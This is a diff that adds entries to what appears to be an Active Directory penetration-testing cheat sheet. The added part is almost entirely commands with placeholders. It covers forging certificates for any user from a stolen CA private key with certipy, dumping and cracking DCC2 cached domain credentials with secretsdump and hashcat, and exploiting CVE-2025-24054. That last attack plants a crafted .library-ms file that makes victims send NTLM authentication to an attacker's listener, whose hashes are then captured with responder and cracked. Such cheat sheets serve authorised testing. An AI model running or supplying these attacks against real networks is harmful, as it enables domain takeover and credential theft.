@@ -159,6 +159,28 @@ GetUserSPNs.py -dc-host <DC_FQDN> -request -k -no-pass '<domain>/<USER>$'   # ->
 hashcat -m19700 -a0 hash.txt <WORDLIST>
 ```
 
+Stolen CA attack — if you land local admin on the CA server itself (not just a vulnerable template), export the CA's private key and forge a certificate for any user offline, no enrollment needed at all:
+```bash
+certipy ca -backup -ca '<CA_NAME>' -username '<USER>@<domain>' -password '<PASS>' -dc-ip <DC_IP> -target <CA_HOST>
+certipy forge -ca-pfx '<CA_NAME>.pfx' -upn '<target-user>@<domain>' -subject 'CN=<target-user>,CN=Users,DC=<DC1>,DC=<DC2>' \
+  -sid '<target-user-SID>' -crl 'ldap:///'   # -crl is required if PKINIT auth fails revocation-check without it
+certipy auth -pfx '<target-user>_forged.pfx' -dc-ip <DC_IP> -username '<target-user>' -domain <domain>
+```
+
+DCC2 (domain cached credentials) cracking — once you have local admin on any domain-joined box, `secretsdump`'s LSA dump often includes a cached logon hash for a domain user who's RDP'd/logged in there before, even a Domain Admin:
+```bash
+secretsdump.py -hashes ':<local-admin-hash>' '<domain>/Administrator@<HOST>' -local-auth   # look for the DCC2 blob in the output
+hashcat -m2100 dcc2_hash.txt <WORDLIST>
+```
+
+CVE-2025-24054 (.library-ms NTLM coercion) — planting a crafted `.library-ms` file on any writable share coerces NTLM auth from whoever's machine renders it in Explorer, same outcome as the classic .lnk/SCF coercion but via a newer file type:
+```bash
+python exploit.py --server <LHOST> --filename '<name>'    # public PoC, builds <name>.library-ms with <url>\\<LHOST>\share</url>
+smbclient.py <user>@<target>   # put the generated file onto any writable share
+sudo responder -I <iface>
+hashcat -a0 -m5600 captured.NTLMv2-SSP <WORDLIST>
+```
+
 Timeroasting — computer accounts can be hashed via unauthenticated SNTP (MS-SNTP), no creds needed at all; useful recon/cred-crack path on a DC with lots of machine accounts:
 ```bash
 nxc smb <DC_IP> -M timeroast                 # dumps RID:hash pairs
